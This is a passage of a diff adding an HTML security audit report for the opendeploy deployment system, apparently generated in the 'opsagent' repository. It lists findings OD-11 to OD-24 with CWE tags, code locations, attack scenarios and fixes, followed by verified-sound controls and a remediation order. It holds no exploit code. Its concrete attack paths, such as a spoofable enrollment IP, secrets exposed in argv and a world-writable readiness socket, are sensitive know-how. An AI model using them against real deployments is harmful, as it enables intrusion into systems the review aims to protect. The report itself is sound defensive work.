+      systemd's default <code class="inl">UMask=0022</code> the file lands at <code class="inl">0644
+      opendeploy:opendeploy</code>. The parent dir is <code class="inl">0750</code>, so "other" is blocked, but any
+      member of the <code class="inl">opendeploy</code> group can read the DB — inconsistent with the restore path,
+      machine key, and recovery file, which are all deliberately <code class="inl">0600</code>.</p>
+    </div>
+    <div class="kv"><div class="k">Attack scenario</div>
+      <p>A local principal in the <code class="inl">opendeploy</code> group reads the argon2id master hash (offline
+      cracking) and all secret ciphertext + wrapped SMK from <code class="inl">primary.db-wal</code>, with no
+      opendeploy privileges.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>After open, <code class="inl">os.Chmod(0600)</code> the DB, <code class="inl">-wal</code>, and
+      <code class="inl">-shm</code> (mirroring <code class="inl">restore.go:102</code>), and/or set
+      <code class="inl">UMask=0077</code> in the unit.</p>
+    </div>
+  </div>
+
+  <!-- OD-11 -->
+  <div class="finding sev-med" id="od-11">
+    <h3><span class="fid">OD-11</span> Unauthenticated enrollment: resource-exhaustion DoS, panic-on-error, spoofable client IP</h3>
+    <div class="badges"><span class="chip c-med">MEDIUM</span><span class="cwe">CWE-770 Allocation Without Limits</span><span class="cwe">CWE-248 Uncaught Exception</span><span class="cwe">CWE-290 Spoofing</span></div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/handler/enrollment.go:39–87</span>
+      <span class="loc">…:57 (MustUpsert…)</span>
+      <span class="loc">…:192–204 (remoteIP / X-Forwarded-For)</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>Any client reaching <code class="inl">:9444</code> (no client cert required) opens enrollment streams with
+      an attacker-chosen machine id. Each call performs a <code class="inl">Must…</code> DB write that
+      <span class="label">panics/crashes the primary</span> on any error, and holds a blocked goroutine + in-memory
+      session until disconnect, with no cap on distinct ids or concurrent sessions.
+      <code class="inl">remoteIP</code> blindly trusts <code class="inl">X-Forwarded-For</code>, so the IP an admin
+      sees before accepting is spoofable.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Cap concurrent/total pending enrollments (per source + global) and rate-limit the listener; don't use
+      panic-on-error writes on an unauthenticated path; ignore <code class="inl">X-Forwarded-For</code> unless a
+      trusted proxy is configured — record <code class="inl">RemoteAddr</code>.</p>
+    </div>
+  </div>
+
+  <!-- OD-12 -->
+  <div class="finding sev-med" id="od-12">
+    <h3><span class="fid">OD-12</span> Restore leaks S3 key + secrets recovery code via process argv</h3>
+    <div class="badges"><span class="chip c-med">MEDIUM</span><span class="cwe">CWE-214 Invocation of Process with Sensitive Args</span></div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">internal/installer/installer.go:97–103</span>
+      <span class="loc">internal/installer/restore.go:81–83,106</span>
+      <span class="loc">scripts/restore_primary.sh:112</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>Restore takes the S3 secret access key and the secrets <span class="label">recovery code</span> (which
+      unlocks the entire secrets store) as command-line flags. Argv is world-readable via
+      <code class="inl">ps</code> / <code class="inl">/proc/&lt;pid&gt;/cmdline</code> for the process lifetime, and
+      lands in shell history.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Accept these via environment variables sourced from a <code class="inl">0600</code> file, stdin, or a
+      prompt — never argv.</p>
+    </div>
+  </div>
+
+  <!-- OD-13 -->
+  <div class="finding sev-med" id="od-13">
+    <h3><span class="fid">OD-13</span> 7-day JWT in localStorage + no Content-Security-Policy</h3>
+    <div class="badges"><span class="chip c-med">MEDIUM</span><span class="cwe">CWE-522 Insufficiently Protected Credentials</span><span class="cwe">CWE-693 Protection Mechanism Failure</span></div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">frontend/src/state/login.js:117 (+62,79–88)</span>
+      <span class="loc">frontend/src/capi/index.js:5–8</span>
+      <span class="loc">frontend/src/index.html (no CSP)</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p>The 7-day session JWT — which grants full control including secret reveal — is persisted in
+      <code class="inl">localStorage</code> under <code class="inl">authSession</code> (plus a legacy
+      <code class="inl">authToken</code> path), readable by any script on the origin. The SPA ships with
+      <span class="label">no CSP</span>, so there is no second line of defence if any injection is ever introduced.
+      No live XSS exists today (VanJS renders attacker data as text — verified), but the app also reveals live
+      secret values into the DOM on demand, so any future script-exec reads both the token and revealed secrets.</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Move the session to an <code class="inl">httpOnly; Secure; SameSite=Strict</code> cookie (or in-memory with
+      silent refresh); have the backend send a strict CSP (<code class="inl">default-src 'self'; frame-ancestors
+      'none'; object-src 'none'; base-uri 'none'</code>) and <code class="inl">X-Frame-Options: DENY</code>; remove
+      the legacy <code class="inl">authToken</code> path.</p>
+    </div>
+  </div>
+
+  <!-- OD-14 -->
+  <div class="finding sev-med" id="od-14">
+    <h3><span class="fid">OD-14</span> Config export bypasses redaction applied on other read paths</h3>
+    <div class="badges"><span class="chip c-med">MEDIUM</span><span class="cwe">CWE-200 Information Exposure</span></div>
+    <div class="kv"><div class="k">Location</div>
+      <span class="loc">backend/handler/export.go:20</span>
+      <span class="loc">backend/handler/redact.go:14–23</span>
+    </div>
+    <div class="kv"><div class="k">What &amp; why</div>
+      <p><code class="inl">PostV1GenerateExportedConfig</code> serializes full <code class="inl">DeploymentConfig</code>
+      objects via <code class="inl">ListActiveDeploymentConfigs()</code> without calling
+      <code class="inl">redactDeploymentConfig</code>, which the live state stream and history <em>do</em> apply. So
+      systemd-runner details deemed sensitive enough to strip elsewhere are present verbatim in the export blob.
+      (Secret <em>values</em> are not leaked — export uses metadata/references only.)</p>
+    </div>
+    <div class="fix"><div class="k">Remediation</div>
+      <p>Apply <code class="inl">redactDeploymentConfig</code> to each config in the export bundle, consistent with
+      the other read paths.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ===================== LOW FINDINGS ===================== -->
+<section id="findings-low">
+  <h2>Low / informational findings</h2>
+  <p>Real issues worth fixing, lower impact or requiring preconditions the current single-admin model already assumes.</p>
+  <div class="finding sev-low" id="od-lows">
+    <table class="plain">
+      <tr><th style="width:64px">ID</th><th style="width:22%">Title</th><th>Detail &amp; fix</th><th style="width:24%">Location</th></tr>
+      <tr>
+        <td><b>OD-15</b><br><span class="cwe">CWE-214</span></td>
+        <td>GitHub token in git argv</td>
+        <td>Clone URLs carry <code class="inl">x-access-token:&lt;token&gt;</code> in userinfo, passed as a git argument → visible in <code class="inl">/proc/&lt;pid&gt;/cmdline</code> while git runs (logs are redacted). <b>Fix:</b> use <code class="inl">GIT_ASKPASS</code>/a credential helper or <code class="inl">http.extraHeader</code> via env, not the URL.</td>
+        <td><span class="loc">preparer/gitmanager.go:89–99</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-16</b><br><span class="cwe">CWE-732</span></td>
+        <td>World-writable readiness dir/socket</td>
+        <td>Readiness rendezvous dir is <code class="inl">0777</code> and socket <code class="inl">0666</code> under the data dir, then bind-mounted into the container. Any local user can send <code class="inl">"ready"</code> to promote a not-ready rollover, or drop files in. <b>Fix:</b> <code class="inl">0700/0600</code> + chown to the container uid.</td>
+        <td><span class="loc">engine/runner/container.go:561–575</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-17</b><br><span class="cwe">CWE-347</span></td>
+        <td>JWT algorithm not pinned</td>
+        <td><code class="inl">jwt.Parse</code> is called without <code class="inl">WithValidMethods</code>. Not exploitable today (the keyfunc returns a typed <code class="inl">*rsa.PublicKey</code>, blocking HS/none confusion), but fragile. <b>Fix:</b> pass <code class="inl">jwt.WithValidMethods([]string{"RS256"})</code>.</td>
+        <td><span class="loc">goutil/authu/jwt.go:114</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-18</b><br><span class="cwe">CWE-613</span></td>
+        <td>No token revocation; master login persists</td>
+        <td>7-day JWTs can't be revoked (no <code class="inl">jti</code>/deny-list, no logout); master login is never disabled once passkeys exist; argon2id hash lacks PHC params (no per-hash param agility). <b>Fix:</b> add a revocation list or short-lived access+refresh tokens; disable master post-bootstrap; store PHC-encoded hashes.</td>
+        <td><span class="loc">handler/passkey.go · auth.go</span><br><span class="loc">authu/password.go</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-19</b><br><span class="cwe">CWE-291</span></td>
+        <td>Enrollment accept: no CN collision check</td>
+        <td>The signed cert CN is the admin-typed <code class="inl">workerName</code> (CSR subject correctly ignored), but nothing checks it doesn't collide with the primary or an existing worker; since cluster identity = CN, a colliding name hijacks another machine's snapshot/status. <b>Fix:</b> reject collisions and reserved names at accept.</td>
+        <td><span class="loc">handler/enrollment.go:97–136</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-20</b><br><span class="cwe">CWE-295</span></td>
+        <td>Cluster CA unconstrained</td>
+        <td>CA sets no <code class="inl">MaxPathLenZero</code>; node/worker leaves omit <code class="inl">BasicConstraintsValid</code>; CSR key type/size is not policed before signing (a weak key would be signed). Not exploitable given operator-gated enrollment + TLS 1.3, but tighten. <b>Fix:</b> set <code class="inl">MaxPathLenZero</code>, add name constraints, reject weak CSR keys.</td>
+        <td><span class="loc">util/certu/sign.go:27–37,69–79,139–149</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-21</b><br><span class="cwe">CWE-1022</span></td>
+        <td>target=_blank without noopener; unencoded repo in href</td>
+        <td>Version links build <code class="inl">https://${deployment.repo}/commit/${v}</code> opened with <code class="inl">target="_blank"</code> and no <code class="inl">rel</code>. Scheme is hard-coded (no <code class="inl">javascript:</code> XSS), but a crafted repo enables phishing / reverse-tabnabbing. <b>Fix:</b> add <code class="inl">rel="noopener noreferrer"</code>; validate host, <code class="inl">encodeURIComponent</code> the version.</td>
+        <td><span class="loc">frontend/src/components/statusCard.js:227–240</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-22</b><br><span class="cwe">CWE-532</span></td>
+        <td>Verbose request/response logging in prod</td>
+        <td>Multiple <code class="inl">console.log</code> of full API request/response objects ship in the production bundle (no <code class="inl">drop_console</code>). No secrets/tokens logged (verified), but repo topology, branches, image refs are exposed to console. <b>Fix:</b> strip via terser <code class="inl">drop:['console']</code> or gate behind a debug flag.</td>
+        <td><span class="loc">frontend/src/components/*.js</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-23</b></td>
+        <td>No FK enforcement; space delete orphans rows</td>
+        <td><code class="inl">foreign_keys</code> pragma is off and the schema has no FK constraints; <code class="inl">DeleteSpace</code> only guards on deployments, so deleting a space with secrets/configs/assets leaves orphaned rows. Data-integrity footgun. <b>Fix:</b> enable FKs with <code class="inl">ON DELETE</code> rules, or extend the pre-delete guard.</td>
+        <td><span class="loc">storage/sqlite/init.go:31 · handler/spaces.go:44–59</span></td>
+      </tr>
+      <tr>
+        <td><b>OD-24</b></td>
+        <td>Migration split &amp; error-swallowing; config id race</td>
+        <td>Migrations run via naive <code class="inl">;</code>-split with broad "already applied" substring matching (a typo'd new migration is silently skipped); <code class="inl">nextUserConfigID</code> uses <code class="inl">MAX(id)+1</code> unserialized → concurrent writes can collide and <code class="inl">panic</code>. Availability/robustness. <b>Fix:</b> versioned migration table in transactions; let SQLite AUTOINCREMENT allocate.</td>
+        <td><span class="loc">storage/sqlite/init.go:42–72 · user_configs.go:66–77</span></td>
+      </tr>
+    </table>
+  </div>
+</section>
+
+<!-- ===================== CHECKED SAFE ===================== -->
+<section id="safe">
+  <h2>What was checked and found sound</h2>
+  <p>A credible review states what holds, not only what breaks. These were examined and are correctly done:</p>
+  <ul class="safe-list">
+    <li><b>No SQL injection.</b> All queries are parameterized (<code class="inl">?</code> placeholders); the one dynamic <code class="inl">ORDER BY</code> is a static literal. <code class="inl">queries.sql.go</code> is sqlc-generated.</li>
+    <li><b>Secrets AEAD is correct.</b> XChaCha20-Poly1305 with 24-byte random nonces from <code class="inl">crypto/rand</code>; AAD binds each ciphertext to its name/class/slot so records can't be swapped. <code class="inl">crypto/rand</code> is used everywhere (no <code class="inl">math/rand</code> in the backend).</li>
+    <li><b>Key hierarchy.</b> SMK sealed under argon2id-derived KEKs (t=3, m=64 MiB, p=4), distinct AAD domains for value-encryption vs key-wrapping, unique per-slot salts. Recovery codes are 256-bit, never stored (only the wrapped SMK).</li>
+    <li><b>Password hashing.</b> argon2id (m=64 MiB, t=3, p=1, 16-byte salt, 32-byte key), verified with <code class="inl">subtle.ConstantTimeCompare</code> after a length check.</li>
+    <li><b>TLS.</b> <code class="inl">MinVersion: TLS 1.3</code> on all listeners; cluster listener enforces <code class="inl">RequireAndVerifyClientCert</code>. Ed25519 CA/leaf keys; EKU separation (worker=ClientAuth, node=ServerAuth); CSR proof-of-possession checked and subject overridden with the operator-chosen name.</li>
+    <li><b>JWT core.</b> RS256/RSA-2048, <code class="inl">kid</code>-based key lookup, private key memory-only (never persisted), <code class="inl">exp</code> enforced; <code class="inl">golang-jwt v4.5.2</code> (patched for CVE-2024-51744).</li>
+    <li><b>Info-disclosure hygiene.</b> <code class="inl">ApiErr.InternalErr</code> is never wire-encoded; non-<code class="inl">ApiErr</code> errors collapse to a generic 500. Secret <em>values</em> appear only on explicit reveal endpoints, never in lists/state-stream/config.</li>
+    <li><b>No shell in the engine.</b> All <code class="inl">exec</code> uses fixed program names with separate args; git ref/branch/path args are cleaned (leading-<code class="inl">-</code>/NUL/CRLF rejected); flake/tree paths block <code class="inl">..</code> and absolute paths. (OD-01 is the exception — via git's own transport, not a shell.)</li>
+    <li><b>Frontend XSS.</b> Build/log output, deployment names, repo URLs, and errors are rendered as VanJS text nodes (auto-escaped). No <code class="inl">innerHTML</code> injection, <code class="inl">eval</code>, <code class="inl">document.write</code>, or open redirects; no hardcoded secrets or committed <code class="inl">.env</code>.</li>
+    <li><b>Request size limits</b> exist on all listeners; asset object keys derive from numeric IDs (no path traversal); upload/rename names reject <code class="inl">/ \ .. \x00</code>.</li>
+    <li><b>sudoers rules</b> are exact-match, no wildcards, installed <code class="inl">0440</code> and validated with <code class="inl">visudo -cf</code> before an atomic rename; containerd/runc deps are version-pinned with per-arch SHA-256.</li>
+  </ul>
+</section>
+
+<!-- ===================== REMEDIATION ORDER ===================== -->
+<section id="order">
+  <h2>Suggested remediation order</h2>
+  <table class="plain">
+    <tr><th>Priority</th><th>Findings</th><th>Rationale</th></tr>
+    <tr><td><b>1 — now</b></td><td>OD-01, OD-03, OD-02</td><td>Together these are unauthenticated RCE → root on a default install. Fix the git protocol allowlist, disable/strengthen the master bootstrap, and remove the ambient caps + service-writable binary.</td></tr>
+    <tr><td><b>2 — soon</b></td><td>OD-04, OD-05, OD-06, OD-07</td><td>Cluster/worker and container trust boundaries: scope worker reads, pin enrollment TLS, harden the container sandbox and mount policy.</td></tr>
+    <tr><td><b>3 — planned</b></td><td>OD-08 – OD-14</td><td>SSRF, supply-chain signing, DB perms, enrollment hardening, credential-in-argv, frontend token/CSP, export redaction.</td></tr>
+    <tr><td><b>4 — hardening</b></td><td>OD-15 – OD-24</td><td>Defense-in-depth and robustness; several become materially more important if a lower-trust role is ever introduced.</td></tr>
+  </table>
+</section>
+
+<footer>
+  <p><b>Methodology &amp; caveats.</b> Manual source review across auth, secrets/crypto/PKI, the deployment engine
+  (runners, preparers, containerd), HTTP handlers/authorization, storage, the installer/sudoers/systemd/scripts, and
+  the frontend. Every finding's file:line was read directly; the four headline findings (OD-01–OD-04) plus the
+  bootstrap-password, enrollment-TLS, and container-spec claims were independently re-verified against source. No code
+  was executed and no dynamic testing was performed, so exploitability notes are analytical. Severities are calibrated
+  to the documented single-admin trust model (see the Trust model section). This review does not replace a
+  penetration test or a formal cryptographic audit.</p>
+  <p class="back">Generated for the <code>opsagent</code> repository · <a href="#summary">back to top ↑</a></p>
+</footer>
+
+</div>
+</body>
+</html>
